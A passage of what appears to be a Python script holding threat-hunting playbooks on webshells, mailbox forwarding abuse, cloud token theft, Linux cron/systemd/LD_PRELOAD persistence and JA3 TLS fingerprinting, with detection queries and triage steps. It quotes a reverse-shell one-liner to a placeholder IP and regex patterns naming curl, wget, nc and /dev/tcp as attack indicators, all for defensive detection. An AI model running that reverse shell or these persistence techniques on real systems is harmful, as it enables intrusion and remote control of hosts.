        values(c_ip) as source_ips
  by cs_uri_stem, s_computername
| where count < 50 AND unique_ips <= 3
| sort - count
```

### EQL - Webshell Upload and Execution Sequence (Elastic)

```eql
sequence by host.id with maxspan=30m
  [file where event.action == "creation" and
   file.extension : ("aspx", "asp", "jsp", "php") and
   file.path : ("*\\inetpub\\*", "*\\wwwroot\\*", "*\\webapps\\*")]
  [process where process.parent.name : ("w3wp.exe", "httpd.exe", "java.exe") and
   process.name : ("cmd.exe", "powershell.exe", "whoami.exe")]
```

## Common Webshell Indicators

| Indicator | Type | Details |
|---|---|---|
| China Chopper | ASPX/PHP | One-line eval/execute with base64 parameter |
| ASPX Spy | ASPX | File manager, SQL client, command execution UI |
| JSP File Browser | JSP | Directory listing and file management |
| b374k | PHP | Full-featured shell with file manager, SQL, terminal |
| P0wnyShell | ASPX | Interactive PowerShell terminal in browser |
| ReGeorg/Neo-reGeorg | Various | SOCKS proxy tunneling through web server |
| Godzilla | Various | Encrypted communication, AES-based |
| IIS Module Backdoor | Native | Compiled DLL loaded as IIS module |

## Expected Results

- Web server processes (w3wp.exe, httpd.exe, java.exe) spawning command shells or recon tools
- New ASPX, JSP, or PHP files appearing in web root directories
- Files with suspicious names such as random characters, test, shell, cmd, upload in web directories
- POST requests to rarely-accessed pages from a single or very few source IPs
- Outbound connections from web server IPs to external hosts on non-standard ports
- Web server process making DNS requests for unusual domains
- Small response sizes from POST requests (indicating command output)

## Triage Steps

1. **Identify the webshell file**: Locate the file on disk. Check its creation timestamp, contents, and hash against known webshell signatures.
2. **Analyze the web logs**: Identify the source IP that accessed the webshell. Trace back to find the initial upload request.
3. **Check the exploitation vector**: How was the file uploaded? Look for exploit signatures in web logs prior to the file creation.
4. **Review executed commands**: From process creation logs, reconstruct what the attacker executed through the webshell.
5. **Check for lateral movement**: Did the web server account make connections to internal hosts? Were credentials harvested?
6. **Identify all webshells**: Scan all web directories for recently modified or created script files. Attackers often deploy multiple shells.
7. **Contain and remediate**: Remove the webshell, patch the exploited vulnerability, rotate web application credentials, and review firewall rules.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| Legitimate deployment tools | Known CI/CD service accounts; deployment during change windows |
| CMS file uploads | Expected for WordPress, SharePoint; via admin interface |
| Developer testing | Dev/staging environments; known developer IPs |
| Application health checks | Known monitoring scripts; scheduled execution |
| Web application frameworks | Template compilation creating .aspx/.jsp files |

## References

- Microsoft DART: Web shell threat hunting
- CISA Alert AA21-321A: Iranian Government-Sponsored APT Webshell Activity
- NSA/CISA: Detect and Prevent Web Shell Malware
- US-CERT: Analysis of China Chopper Web Shell
"""
    ))

    # ---------- Article 15 ----------
    articles.append((
        "Hunting for Email Forwarding Rules and Mailbox Abuse",
        ["threat-hunting", "email", "business-email-compromise", "persistence", "exfiltration", "cloud"],
        r"""# Hunting for Email Forwarding Rules and Mailbox Abuse

## Overview

Business Email Compromise (BEC) and mailbox abuse are among the most financially
damaging cyberattacks. After compromising an email account, adversaries create
inbox rules to forward emails to external addresses, hide evidence of their
activity, or monitor specific keywords like "invoice", "payment", and "wire
transfer". These rules persist even after password resets unless explicitly
removed, making them a stealthy persistence mechanism.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1114.002 | Email Collection: Remote Email Collection | Collection |
| T1114.003 | Email Collection: Email Forwarding Rule | Collection |
| T1078.004 | Valid Accounts: Cloud Accounts | Initial Access |
| T1564.008 | Hide Artifacts: Email Hiding Rules | Defense Evasion |
| T1098.002 | Account Manipulation: Additional Email Delegate Permissions | Persistence |

## Hypothesis

An adversary who has compromised one or more email accounts is creating inbox
rules to forward sensitive emails to external addresses, deleting or hiding
incoming messages to conceal their activity, and monitoring mailbox content
for financial information to facilitate wire fraud or data theft.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Microsoft 365 | Unified Audit Log | Operation, UserId, ClientIP, Parameters |
| Exchange Online | Mailbox Audit Log | Operation, LogonType, ClientIPAddress |
| Azure AD / Entra ID | Sign-in logs | ipAddress, location, riskLevel |
| Exchange On-Premises | Message Tracking | sender, recipients, subject |
| CASB | Shadow IT / DLP | cloud_app, action, user |

## Detection Queries

### KQL - New Inbox Rule Created (Microsoft Sentinel)

```kql
OfficeActivity
| where Operation in ("New-InboxRule", "Set-InboxRule", "Enable-InboxRule")
| extend RuleParams = tostring(Parameters)
| where RuleParams has_any ("ForwardTo", "ForwardAsAttachmentTo", "RedirectTo", "DeleteMessage", "MarkAsRead", "MoveToFolder")
| project TimeGenerated, UserId, ClientIP, Operation, RuleParams
| sort by TimeGenerated desc
```

### KQL - External Email Forwarding Configuration (Microsoft Sentinel)

```kql
OfficeActivity
| where Operation == "Set-Mailbox"
| extend Params = tostring(Parameters)
| where Params has "ForwardingSmtpAddress" or Params has "ForwardingAddress"
| where Params has_any ("@gmail", "@yahoo", "@hotmail", "@outlook", "@protonmail")
| project TimeGenerated, UserId, ClientIP, Params
```

### KQL - Mailbox Delegate Added (Microsoft Sentinel)

```kql
OfficeActivity
| where Operation in ("Add-MailboxPermission", "Add-RecipientPermission", "Set-MailboxFolderPermission")
| extend Params = tostring(Parameters)
| where Params has "FullAccess" or Params has "SendAs" or Params has "SendOnBehalf"
| project TimeGenerated, UserId, ClientIP, Operation, Params
```

### SPL - New Inbox Rules with Suspicious Actions (Splunk)

```spl
index=o365 Operation IN ("New-InboxRule", "Set-InboxRule")
| spath input=Parameters
| where match(Parameters, "(?i)(forwardto|forwardasattachmentto|redirectto|deletemessage|markasread)")
| rex field=Parameters "(?i)(?:ForwardTo|ForwardAsAttachmentTo|RedirectTo)[^\"]*\"(?<forward_target>[^\"]+)\""
| stats count, values(forward_target) as targets, values(ClientIP) as source_ips
  by UserId, Operation
| sort - count
```

### SPL - Email Forwarding to External Domain (Splunk)

```spl
index=o365 (Operation="Set-Mailbox" OR Operation="New-TransportRule")
| spath input=Parameters
| where match(Parameters, "(?i)(forwardingsmtpaddress|forwardingaddress)")
| rex field=Parameters "(?i)smtp:(?<forward_address>[^\"]+)"
| where NOT match(forward_address, "(?i)@(yourdomain\.com|yourcompany\.com)")
| stats count by UserId, forward_address, ClientIP
| sort - count
```

### SPL - Inbox Rules Hiding Emails (Splunk)

```spl
index=o365 Operation IN ("New-InboxRule", "Set-InboxRule")
| spath input=Parameters
| where match(Parameters, "(?i)(deletemessage.*true|movetofolder.*deleted|movetofolder.*junk|markasread.*true)")
| where match(Parameters, "(?i)(subjectcontains|from|bodycontains)")
| rex field=Parameters "(?i)(?:SubjectContains|BodyContains|From)[^\"]*\"(?<filter_keyword>[^\"]+)\""
| stats count, values(filter_keyword) as keywords by UserId, ClientIP
| sort - count
```

### SPL - Suspicious Logon Followed by Rule Creation (Splunk)

```spl
index=azure_ad SigninStatus="Success"
| append [search index=o365 Operation IN ("New-InboxRule", "Set-InboxRule")]
| sort 0 _time
| streamstats current=f last(Operation) as prev_op,
        last(ClientIP) as prev_ip,
        last(_time) as prev_time
  by UserId
| where Operation IN ("New-InboxRule", "Set-InboxRule")
| eval time_since_logon = _time - prev_time
| where time_since_logon < 3600
| iplocation ClientIP
| table _time, UserId, ClientIP, City, Country, Operation, Parameters, time_since_logon
```

## Suspicious Inbox Rule Patterns

| Rule Pattern | Indicates |
|---|---|
| Forward all mail to external address | Bulk email exfiltration |
| Forward emails containing "invoice", "payment", "wire" | Financial fraud preparation |
| Delete emails from specific senders | Hiding security alerts or victim responses |
| Mark as read and move to obscure folder | Concealing attacker activity |
| Rule name with spaces or periods only | Attempt to hide rule in UI |
| Forward only when specific words in subject | Targeted collection of sensitive data |

## Expected Results

- New inbox rules that forward to external email providers (Gmail, Yahoo, ProtonMail)
- Rules with conditions matching financial keywords (invoice, payment, wire, bank, transfer)
- Rules that delete messages or move them to RSS Feeds, Deleted Items, or custom hidden folders
- Rules with deceptive names (empty string, spaces, periods, or mimicking system rules)
- Mailbox forwarding configured at the mailbox level via Set-Mailbox
- FullAccess or SendAs permissions added to mailboxes by non-admin accounts
- Rule creation from IP addresses in different countries from the user's normal location

## Triage Steps

1. **Review the rule details**: What does the rule do? Where does it forward to? What conditions trigger it?
2. **Check the source IP**: Where was the rule created from? Does it match the user's normal logon locations?
3. **Review sign-in history**: Was there a suspicious sign-in (risky location, new device) before the rule was created?
4. **Contact the user**: Ask if they created the rule. If not, the account is compromised.
5. **Check for sent emails**: Did the attacker send emails from the compromised account (wire fraud, phishing)?
6. **Review forwarded content**: What emails have already been forwarded to the external address?
7. **Remediate**: Remove the rule, reset the password, revoke all sessions, enable MFA, and review for additional compromised accounts.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| User-created forwarding | User confirms creation; forwarding to known personal email; created from expected location |
| IT-managed transport rules | Created by admin accounts; applied organization-wide |
| Shared mailbox delegation | Approved by mailbox owner; IT-provisioned permissions |
| Out-of-office rules | Standard Outlook OOF rules; created during normal access |
| CRM or ticketing integration | Known integration accounts; forwarding to internal services |

## Remediation Checklist

1. Disable the malicious inbox rule immediately
2. Remove any unauthorized mailbox delegates or permissions
3. Reset the compromised account password
4. Revoke all active sessions and refresh tokens
5. Enable or verify MFA is active on the account
6. Review sent items and deleted items for attacker activity
7. Notify affected parties if financial fraud emails were sent
8. Submit the forwarding email address to abuse@provider for takedown

## References

- Microsoft: Detect and Remediate Outlook Rules and Custom Forms Injections
- FBI: Business Email Compromise Advisory
- CISA: Strengthening Security Configurations to Defend Against BEC
"""
    ))

    # ---------- Article 16 ----------
    articles.append((
        "Hunting for Cloud Token Theft and Session Hijacking",
        ["threat-hunting", "cloud", "token-theft", "session-hijacking", "azure-ad", "aws", "identity"],
        r"""# Hunting for Cloud Token Theft and Session Hijacking

## Overview

As organizations adopt cloud identity providers such as Azure AD (Entra ID),
Okta, and AWS IAM, adversaries have adapted by stealing OAuth tokens, session
cookies, and refresh tokens rather than passwords. Token theft allows attackers
to bypass MFA entirely because the stolen token represents an already-authenticated
session. Techniques include adversary-in-the-middle (AiTM) phishing proxies,
token extraction from compromised endpoints, and abuse of OAuth application
consent grants.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1528 | Steal Application Access Token | Credential Access |
| T1539 | Steal Web Session Cookie | Credential Access |
| T1550.001 | Use Alternate Authentication Material: Application Access Token | Lateral Movement |
| T1098.003 | Account Manipulation: Additional Cloud Roles | Persistence |
| T1078.004 | Valid Accounts: Cloud Accounts | Initial Access, Persistence |

## Hypothesis

An adversary has stolen cloud authentication tokens through AiTM phishing,
endpoint compromise, or OAuth consent abuse, and is using those tokens to
access cloud resources, email, and APIs while bypassing multi-factor
authentication controls.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Azure AD / Entra ID | Sign-in logs | ipAddress, tokenIssuerType, authenticationRequirement, riskLevel |
| Azure AD | Audit logs | Operation, InitiatedBy, Target, ModifiedProperties |
| Azure AD | Service Principal logs | appId, appDisplayName, signInActivity |
| Microsoft 365 | Unified Audit Log | Operation, ClientIP, UserAgent |
| AWS | CloudTrail | eventName, sourceIPAddress, userIdentity, sessionIssuer |
| Okta | System Log | eventType, client.ipAddress, outcome, authenticationContext |

## Detection Queries

### KQL - Azure AD: Token Replay from Different IP (Microsoft Sentinel)

```kql
SigninLogs
| where ResultType == 0
| where TokenIssuerType == "AzureAD"
| summarize IPs = make_set(IPAddress),
            Locations = make_set(LocationDetails.city),
            count()
  by UserPrincipalName, AppDisplayName, bin(TimeGenerated, 1h)
| where array_length(IPs) > 1
| extend IPCount = array_length(IPs)
| where IPCount >= 2
| sort by TimeGenerated desc
```

### KQL - Azure AD: MFA Bypass via Token (Microsoft Sentinel)

```kql
SigninLogs
| where ResultType == 0
| where AuthenticationRequirement == "singleFactorAuthentication"
| where UserPrincipalName !endswith "$"
| where AppDisplayName !in ("Windows Sign In", "Microsoft Authentication Broker")
| where ConditionalAccessStatus == "notApplied" or ConditionalAccessStatus == "success"
| project TimeGenerated, UserPrincipalName, IPAddress, AppDisplayName,
          AuthenticationRequirement, DeviceDetail, LocationDetails
| sort by TimeGenerated desc
```

### KQL - Suspicious OAuth App Consent (Microsoft Sentinel)

```kql
AuditLogs
| where OperationName == "Consent to application"
| extend ConsentActor = tostring(InitiatedBy.user.userPrincipalName)
| extend AppName = tostring(TargetResources[0].displayName)
| extend Permissions = tostring(TargetResources[0].modifiedProperties)
| where Permissions has_any ("Mail.Read", "Mail.ReadWrite", "Files.ReadWrite.All",
        "Directory.ReadWrite.All", "User.ReadWrite.All", "offline_access")
| project TimeGenerated, ConsentActor, AppName, Permissions
```

### SPL - AWS: Console Login from Stolen Session Token (Splunk)

```spl
index=aws sourcetype=aws:cloudtrail eventName=ConsoleLogin
| spath output=session_issuer path=userIdentity.sessionContext.sessionIssuer.type
| where session_issuer="Role"
| spath output=mfa_used path=additionalEventData.MFAUsed
| where mfa_used!="Yes"
| stats count, values(sourceIPAddress) as source_ips,
        dc(sourceIPAddress) as unique_ips
  by userIdentity.arn
| where unique_ips > 1
| sort - unique_ips
```

### SPL - AWS: AssumeRole from Unusual Source (Splunk)

```spl
index=aws sourcetype=aws:cloudtrail eventName IN ("AssumeRole", "AssumeRoleWithSAML", "AssumeRoleWithWebIdentity")
| spath output=role_arn path=requestParameters.roleArn
| spath output=src_identity path=userIdentity.arn
| stats count, values(sourceIPAddress) as ips,
        values(userAgent) as agents
  by src_identity, role_arn
| where count > 0
| sort - count
```

### SPL - Okta: Session Cookie Replay Detection (Splunk)

```spl
index=okta eventType="user.session.start"
| iplocation client.ipAddress
| sort 0 _time
| streamstats current=f last(client.ipAddress) as prev_ip,
        last(_time) as prev_time,
        last(City) as prev_city
  by actor.alternateId
| eval time_diff = _time - prev_time
| where time_diff < 300 AND prev_ip != client.ipAddress
| table _time, actor.alternateId, client.ipAddress, City, prev_ip, prev_city, time_diff
```

### SPL - Azure AD: AiTM Phishing Proxy Indicators (Splunk)

```spl
index=azure_ad SigninStatus="Success"
| where match(UserAgent, "(?i)(python|axios|node-fetch|go-http|curl)")
  OR match(OriginalTransferMethod, "(?i)deviceCodeFlow")
| stats count, values(IPAddress) as ips, values(AppDisplayName) as apps
  by UserPrincipalName, UserAgent
| sort - count
```

## Expected Results

- Same user authenticating from multiple distinct IP addresses within a short window
- Successful sign-ins that bypass MFA (singleFactorAuthentication) for accounts that have MFA enforced
- OAuth applications requesting high-privilege permissions (Mail.ReadWrite, Directory.ReadWrite.All)
- Sign-ins with unusual user agents (Python-urllib, axios, node-fetch) indicating programmatic token use
- AWS AssumeRole calls from IP addresses not associated with the expected identity
- Session start events in Okta from different IPs within seconds of each other
- Device code flow authentication requests that the user did not initiate

## Triage Steps

1. **Identify the token source**: How was the token obtained? Check for recent phishing emails, AiTM proxy domains, or endpoint compromise.
2. **Review the affected account's sign-in history**: Look for the initial compromise point where the token was first stolen.
3. **Check OAuth app consents**: Were any new applications granted consent? Review the permissions granted.
4. **Examine API activity**: What did the attacker access with the stolen token? Check email reads, file downloads, directory queries.
5. **Verify device compliance**: Was the sign-in from a managed device? Unmanaged devices accessing corporate resources may indicate token theft.
6. **Check for mail rules**: After gaining email access via token, attackers often create forwarding rules (see Email Forwarding Rules playbook).
7. **Revoke and remediate**: Revoke all refresh tokens for the user, require re-authentication, review and remove suspicious OAuth consents, rotate any API keys.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| VPN IP changes | User's VPN exits from different IPs; same geographic region |
| Mobile carrier NAT | Mobile users showing different IPs; same city/carrier |
| Conditional Access policy gaps | Expected for specific apps configured without MFA requirement |
| Legitimate OAuth apps | Well-known apps (Slack, Zoom, Salesforce); admin-approved |
| DevOps automation | Service principals; expected API user agents; known CI/CD IPs |

## AiTM Phishing Proxy Indicators

Common AiTM phishing frameworks and their signatures:

| Framework | Indicator |
|---|---|
| Evilginx2 | Custom phishing domains proxying to login.microsoftonline.com |
| Modlishka | Reverse proxy with modified response headers |
| Muraena | Go-based proxy with automated credential and token capture |
| EvilProxy (PhaaS) | Phishing-as-a-Service; rotating infrastructure |

Look for sign-ins where the browser fingerprint or session metadata does not
match the subsequent API calls using the same token.

## Hardening Recommendations

- Deploy Conditional Access policies requiring compliant/managed devices
- Enable token protection (token binding) in Azure AD where supported
- Implement Continuous Access Evaluation (CAE) to detect token replay
- Restrict OAuth app consent to admin-approved applications only
- Monitor and alert on high-risk sign-in detections from Identity Protection

## References

- Microsoft: Token theft playbook for Azure AD
- Microsoft: Investigating AiTM phishing attacks
- AWS: Best Practices for Securing Temporary Credentials
- Okta: Detecting Session Token Theft
"""
    ))

    # ---------- Article 17 ----------
    articles.append((
        "Hunting for Living-off-the-Land in Linux (cron, systemd, LD_PRELOAD)",
        ["threat-hunting", "linux", "living-off-the-land", "persistence", "cron", "systemd", "ld-preload"],
        r"""# Hunting for Living-off-the-Land in Linux (cron, systemd, LD_PRELOAD)

## Overview

Linux systems offer numerous built-in mechanisms that adversaries can abuse for
persistence, privilege escalation, and defense evasion without deploying custom
malware. Cron jobs, systemd services and timers, LD_PRELOAD library injection,
shell profile modifications, and authorized_keys manipulation are the most
common living-off-the-land techniques on Linux. Detecting these requires
monitoring file system changes, process execution, and configuration
modifications across the Linux estate.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1053.003 | Scheduled Task/Job: Cron | Persistence, Execution |
| T1543.002 | Create or Modify System Process: Systemd Service | Persistence, Privilege Escalation |
| T1574.006 | Hijack Execution Flow: Dynamic Linker Hijacking (LD_PRELOAD) | Persistence, Defense Evasion |
| T1546.004 | Event Triggered Execution: Unix Shell Configuration Modification | Persistence |
| T1098.004 | Account Manipulation: SSH Authorized Keys | Persistence |

## Hypothesis

An adversary who has gained access to Linux systems is establishing persistence
and evading detection by abusing built-in mechanisms such as cron jobs, systemd
unit files, LD_PRELOAD environment hijacking, shell profile backdoors, and SSH
authorized keys rather than deploying traditional malware.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Auditd | SYSCALL, EXECVE, PATH | exe, a0-a3, key, comm, uid |
| Syslog | cron, auth | command, user, pid |
| File Integrity | FIM (AIDE, OSSEC, osquery) | file_path, hash, event_type |
| EDR (Linux) | Process, File events | process.name, file.path, user.name |
| systemd journal | journalctl | unit, message, _SYSTEMD_UNIT |
| osquery | scheduled_queries | crontab, systemd_units, authorized_keys |

## Detection Queries

### KQL - New Cron Job Creation (Elastic)

```kql
(event.category: "file" AND
 file.path: (*/etc/crontab* OR */etc/cron.d/* OR */var/spool/cron/* OR
             */etc/cron.hourly/* OR */etc/cron.daily/* OR */etc/cron.weekly/*) AND
 event.action: ("creation" OR "modification")) OR
(process.name: "crontab" AND process.args: ("-e" OR "-l" OR "-r"))
```

### KQL - New Systemd Service or Timer Created (Elastic)

```kql
event.category: "file" AND
file.path: (*/etc/systemd/system/*.service OR */etc/systemd/system/*.timer OR
            */.config/systemd/user/*.service OR */usr/lib/systemd/system/*.service) AND
event.action: ("creation" OR "modification") AND
NOT process.name: ("dnf" OR "yum" OR "apt" OR "dpkg" OR "rpm" OR "packagekit")
```

### KQL - LD_PRELOAD Modification (Elastic)

```kql
(event.category: "file" AND
 file.path: "/etc/ld.so.preload" AND
 event.action: ("creation" OR "modification")) OR
(event.category: "process" AND
 process.env_vars: *LD_PRELOAD*)
```

### KQL - SSH Authorized Keys Modification (Elastic)

```kql
event.category: "file" AND
file.path: */.ssh/authorized_keys* AND
event.action: ("creation" OR "modification") AND
NOT process.name: ("sshd" OR "cloud-init" OR "waagent")
```

### SPL - Suspicious Cron Job Content (Splunk)

```spl
index=osquery sourcetype=osquery:results name=crontab
| where match(command, "(?i)(curl|wget|python|perl|bash\s+-[ci]|nc\s|ncat|/dev/tcp|base64|eval)")
  OR match(command, "(?i)(\.onion|pastebin|hastebin|transfer\.sh|ngrok)")
  OR match(command, "(?i)(/tmp/|/dev/shm/|/var/tmp/)")
| stats count by host, user, command, path
| sort - count
```

### SPL - New Systemd Unit Files (Splunk)

```spl
index=osquery sourcetype=osquery:results name=systemd_units
| where type="service" OR type="timer"
| where NOT match(source, "(?i)(/usr/lib/systemd/|/lib/systemd/)")
| where match(source, "(?i)(/etc/systemd/system/|\.config/systemd/user/)")
| lookup known_systemd_units.csv unit_name as id OUTPUT expected
| where isnull(expected)
| stats count by host, id, description, source, active_state, sub_state
```

### SPL - LD_PRELOAD Abuse Detection (Splunk)

```spl
index=auditd type=EXECVE
| where match(a0, "(?i)(ld_preload)") OR match(a1, "(?i)(ld_preload)")
| stats count by host, uid, exe, a0, a1, a2
| sort - count

index=osquery sourcetype=osquery:results name=file
  path="/etc/ld.so.preload"
| where size > 0
| stats count by host, path, size, mtime
```

### SPL - Shell Profile Backdoor Detection (Splunk)

```spl
index=osquery sourcetype=osquery:results name=file_events
| where match(target_path, "(?i)(\\.bashrc|\\.bash_profile|\\.profile|\\.zshrc|/etc/profile\\.d/)")
| where action IN ("CREATED", "UPDATED")
| stats count by host, target_path, action, uid, time
| sort - time
```

### SPL - SSH Authorized Keys Changes (Splunk)

```spl
index=fim OR index=osquery
| where match(file_path, "(?i)(authorized_keys|authorized_keys2)")
| where action IN ("created", "modified", "UPDATED", "CREATED")
| stats count by host, file_path, action, user, time
| sort - time
```

## Expected Results

- New cron jobs containing curl, wget, python reverse shells, or base64 encoded commands
- Cron jobs executing binaries from /tmp, /dev/shm, or /var/tmp
- New systemd service units not installed by package managers
- Systemd services with ExecStart pointing to scripts in writable directories
- /etc/ld.so.preload file modified or created (rarely used legitimately)
- LD_PRELOAD environment variable set in shell profiles or service configurations
- Modifications to .bashrc, .bash_profile, .profile, or /etc/profile.d/ scripts
- New SSH authorized_keys entries added by non-standard processes
- Systemd timers replacing cron for periodic execution of malicious commands

## Common Linux LOL Techniques

| Technique | Mechanism | Detection Point |
|---|---|---|
| Reverse shell via cron | Cron executes bash -i >& /dev/tcp/IP/PORT 0>&1 | Crontab content analysis |
| Systemd persistence | Custom .service unit with ExecStart=/tmp/backdoor | New unit file creation |
| LD_PRELOAD rootkit | Shared library loaded before all others, hooks libc functions | /etc/ld.so.preload changes |
| .bashrc backdoor | Malicious command appended to shell profile | File modification events |
| SSH key persistence | Attacker's public key added to authorized_keys | authorized_keys file changes |
| at job scheduling | One-time delayed execution via at daemon | atd log entries |
| rc.local persistence | Commands in /etc/rc.local or /etc/rc.d/ | File modification in /etc/rc* |
| MOTD backdoor | Executable scripts in /etc/update-motd.d/ | New file creation |

## Triage Steps

1. **Identify the change**: What was modified? Cron job, systemd unit, shell profile, authorized_keys, or LD_PRELOAD?
2. **Examine the content**: What does the new entry do? Look for reverse shells, downloaders, miners, or backdoors.
3. **Identify the actor**: Which user or process made the change? Check auditd logs for the responsible UID and process.
4. **Check the timeline**: When was the change made? Correlate with initial access or lateral movement events.
5. **Verify legitimacy**: Was this a legitimate system administration action? Check change management records.
6. **Inspect referenced binaries**: If the persistence mechanism points to a binary, analyze it. Check hash against threat intel.
7. **Scope the attack**: Search for the same persistence mechanism across all Linux hosts. Automated deployment suggests a scripted attack.

## False Positive Guidance

| False Positive Source | How to Distinguish |
|---|---|
| Package manager installations | apt, yum, dnf, rpm as the modifying process; known package names |
| Configuration management | Ansible, Puppet, Chef, SaltStack as the modifying process; expected changes |
| Cloud-init provisioning | cloud-init process; occurs only at instance launch |
| System administrator actions | Change logged under known admin UID; during maintenance window |
| Monitoring agent installation | Known monitoring tools (Datadog, node_exporter); signed packages |

## References

- GTFOBins: Unix binaries that can be exploited by attackers
- MITRE ATT&CK Linux matrix: Persistence techniques
- Elastic: Detecting Linux Persistence Mechanisms
- Auditd rule examples for persistence detection
"""
    ))

    # ---------- Article 18 ----------
    articles.append((
        "Hunting in Encrypted Traffic Using JA3/JA4 and TLS Metadata",
        ["threat-hunting", "tls", "ja3", "ja4", "encrypted-traffic", "network", "c2"],
        r"""# Hunting in Encrypted Traffic Using JA3/JA4 and TLS Metadata

## Overview

With over 95% of web traffic now encrypted, traditional payload inspection is
largely ineffective for threat detection. However, the TLS handshake itself
leaks valuable metadata that defenders can use for hunting. JA3 fingerprints
hash the TLS Client Hello parameters to create a unique identifier for the
client application. JA4 extends this with additional fields including QUIC
support, SNI, and ALPN. Combined with certificate metadata, TLS version
analysis, and connection patterns, encrypted traffic analysis enables detection
of C2 communication, malware callbacks, and unauthorized applications without
decryption.

## MITRE ATT&CK References

| Technique ID | Name | Tactic |
|---|---|---|
| T1573.001 | Encrypted Channel: Symmetric Cryptography | Command and Control |
| T1573.002 | Encrypted Channel: Asymmetric Cryptography | Command and Control |
| T1071.001 | Application Layer Protocol: Web Protocols | Command and Control |
| T1001.003 | Data Obfuscation: Protocol Impersonation | Command and Control |
| T1568 | Dynamic Resolution | Command and Control |

## Hypothesis

Adversaries are using encrypted channels for C2 communication and data
exfiltration, but the TLS handshake metadata (JA3/JA4 fingerprints, certificate
details, cipher suites, and SNI values) reveals indicators of malicious tooling,
self-signed certificates, and impersonated legitimate services that can be
detected without traffic decryption.

## Data Sources Required

| Data Source | Log Type | Key Fields |
|---|---|---|
| Zeek | ssl.log | ja3, ja3s, server_name, issuer, subject, version, cipher |
| Suricata | TLS events | ja3.hash, tls.sni, tls.issuerdn, tls.subject |
| Proxy with TLS inspection | Connection metadata | ja3_hash, server_name, certificate_issuer |
| Network Sensor | Arkime/Moloch | ja3, ja3s, tls.ja4, cert.issuer, cert.subject |
| Palo Alto | Traffic logs | tls-version, tls-keyxchg, tls-enc, tls-auth |
| EDR | Network events with TLS | tls.client.ja3, tls.server.ja3s, tls.server_name |

## Detection Queries

### KQL - Known Malicious JA3 Fingerprints (Elastic)

```kql
tls.client.ja3: (
  "72a589da586844d7f0818ce684948eea" OR
  "a0e9f5d64349fb13191bc781f81f42e1" OR
  "e35df3e28bdeda07e758d9eec03b0032" OR
  "6734f37431670b3ab4292b8f60f29984" OR
  "b32309a26951912be7dba376398abc3b" OR
  "d0ec4b50a944b182fc10ff51f883ccf7"
)
```

### KQL - Self-Signed or Unusual Certificate Authorities (Elastic)

```kql
tls.server.x509.issuer.common_name: * AND
NOT tls.server.x509.issuer.organization: (
  "DigiCert*" OR "Let's Encrypt" OR "Sectigo*" OR "GlobalSign*" OR
  "Comodo*" OR "GoDaddy*" OR "Amazon" OR "Google Trust*" OR
  "Microsoft*" OR "Entrust*" OR "Baltimore*"
) AND
tls.server.not_after: *
```

### KQL - JA3 Fingerprint Rare in Environment (Elastic)

```kql
tls.client.ja3: * AND destination.port: 443
| stats count() as occurrences, dc(source.ip) as unique_sources,
        dc(destination.ip) as unique_destinations
  by tls.client.ja3
| where occurrences < 10 AND unique_sources <= 2
| sort occurrences asc
```

### KQL - TLS Connection Without SNI (Elastic)

```kql
event.category: "network" AND
destination.port: 443 AND
NOT tls.client.server_name: * AND
NOT destination.ip: ("10.0.0.0/8" OR "172.16.0.0/12" OR "192.168.0.0/16")
```

### SPL - JA3 Hunting with Threat Intel Enrichment (Splunk)

```spl
index=zeek sourcetype=zeek:ssl
| lookup ja3_threat_intel.csv ja3 as ja3 OUTPUT threat_name, confidence
| where isnotnull(threat_name)
| stats count, values(threat_name) as threats,
        values(id.orig_h) as sources,
        values(server_name) as sni,
        values(id.resp_h) as destinations
  by ja3
| sort - count
```

### SPL - Rare JA3 Fingerprints (Splunk)

```spl
index=zeek sourcetype=zeek:ssl
| stats count, dc(id.orig_h) as unique_sources,
        dc(id.resp_h) as unique_dests,
        values(server_name) as sni_values,
        values(id.orig_h) as source_ips
  by ja3
| where count < 10 AND unique_sources <= 2
| sort count
| head 50
```

### SPL - Self-Signed Certificate Detection (Splunk)

```spl
index=zeek sourcetype=zeek:x509
| where certificate.issuer == certificate.subject
| where san.dns != "localhost"
| stats count, values(san.dns) as domains,
        values(certificate.issuer) as issuers
  by certificate.serial, host
| sort - count
```

### SPL - Certificate Age and Validity Analysis (Splunk)

```spl
index=zeek sourcetype=zeek:x509
| eval cert_age_days = (now() - strptime(certificate.not_before, "%Y-%m-%dT%H:%M:%S")) / 86400
| eval validity_days = (strptime(certificate.not_after, "%Y-%m-%dT%H:%M:%S") - strptime(certificate.not_before, "%Y-%m-%dT%H:%M:%S")) / 86400
| where cert_age_days < 30 OR validity_days > 3650 OR validity_days < 30
| stats count by certificate.issuer, certificate.subject, cert_age_days, validity_days
| sort - count
```

### SPL - JA3S Server Fingerprint Mismatch (Splunk)

```spl
index=zeek sourcetype=zeek:ssl
| stats count, values(ja3s) as server_fingerprints, dc(ja3s) as unique_ja3s
  by server_name
| where unique_ja3s > 3
| sort - unique_ja3s
```

### EQL - Process with Known Malicious JA3 Making Connections (Elastic)

```eql
network where tls.client.ja3 : (
  "72a589da586844d7f0818ce684948eea",
  "a0e9f5d64349fb13191bc781f81f42e1",
  "e35df3e28bdeda07e758d9eec03b0032") and
  not process.name : ("chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe")
```

## Known C2 Framework JA3 Fingerprints

| JA3 Hash | Framework / Tool | Notes |
|---|---|---|
| 72a589da586844d7f0818ce684948eea | Cobalt Strike (default) | Most common; varies with malleable profiles |
| a0e9f5d64349fb13191bc781f81f42e1 | Metasploit Meterpreter | Default TLS configuration |
| e35df3e28bdeda07e758d9eec03b0032 | PoshC2 | Python-based C2 |
| 6734f37431670b3ab4292b8f60f29984 | Sliver C2 | Go-based implant |
| b32309a26951912be7dba376398abc3b | Trickbot | Banking trojan C2 |
| d0ec4b50a944b182fc10ff51f883ccf7 | AsyncRAT | Common RAT |
| 3b5074b1b5d032e5620f69f9f700ff0e | IcedID | Loader and banking trojan |

Note: Sophisticated operators customize TLS libraries to alter JA3 fingerprints.
Rely on JA3 as one signal among many, not as a sole detection.

## JA4 Fingerprinting Advantages

JA4 improves upon JA3 by providing:

